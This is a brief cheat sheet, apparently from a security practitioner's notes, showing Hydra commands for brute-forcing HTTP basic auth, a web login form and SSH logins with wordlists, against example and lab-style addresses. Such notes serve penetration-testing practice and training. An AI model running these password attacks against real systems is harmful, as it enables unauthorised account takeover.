---
title: "Hydra"
date: 2024-7-2
tags: ["hydra", "password", "brute force"]
---

---
### HTTP basic auth

```bash
hydra -L usernames -P passwords -s 8080 -f example.com http-get /
```

```
+-------------------------------------------+
| -s : port                                 |
| -L : usernames file                       |
| -P : passwords file                       |
| -f : exit when a login/pass pair is found |
+-------------------------------------------+
```

### Web Page Login Form

```bash
hydra 10.10.11.10 -l admin -P /usr/share/seclists/Passwords/500-worst-passwords.txt http-post-form "/login.php:username=admin&password=^PASS^&remember=yes:Incorrect password"
```

```
+-------------------------------------------+
| -l                 : username             |
| -P                 : wordlist             |
| http-post-form     : service              |
| /login.php         : action               |
| ^PASS^             : payload indicator    |
| Incorrect password : login failure string |
+-------------------------------------------+
```

### SSH with user:password wordlist

```bash
hydra -C creds.txt ssh://10.10.11.10
```

<br>